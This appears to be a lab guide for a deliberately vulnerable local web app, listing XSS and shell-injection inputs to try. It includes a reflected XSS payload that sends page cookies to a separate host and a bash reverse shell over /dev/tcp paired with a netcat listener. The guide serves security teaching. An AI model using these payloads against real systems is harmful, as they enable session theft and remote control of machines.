## Vulnerable Services

### Self XSS

Try some inputs inputs in the first field:

- `<strong>cat`
- `<img src="doesnt exist" onerror="alert('I just executed some JavaScript, yikes!')">`

### Reflected & Persistent XSS

Here's an example some URL which would be pretty naughty

- <http://localhost:8080/private/reflected-xss.html?first=%3Cimg%20src=%22doesnt%20exist%22%20onerror=%22alert(%27I%20just%20executed%20some%20JavaScript%20without%20any%20human%20interaction%20on%20the%20page!%27)%22%3E&autoSubmit=true>
- <http://localhost:8080/private/reflected-xss.html?first=%3Cimg%20src=%22doesnt%20exist%22%20onerror=%22fetch(`http://localhost:1337/steal-cookies?cookie=${encodeURIComponent(document.cookie)}`)%22%3E&autoSubmit=true>

## Shell Injection

Here's some inputs to try for the Video URL in the Shell Injection example.

- `; sleep 1;`
- `; /bin/bash -i >& /dev/tcp/172.20.0.3/7777 0>&1;`

For the latter input, you need to first open a netcat listener on the attacker-controlled-service (`make login-attacker-controlled-services`) with...

```
# Open a netcat listener on the attacker machine (e.g. 172.20.0.2)
nc -nlvp 7777
```

```
# Open a reverse shell connection on the victim machine (you do this part via injection on the vulnerable web app)
/bin/bash -i >& /dev/tcp/172.20.0.3/7777 0>&1
```
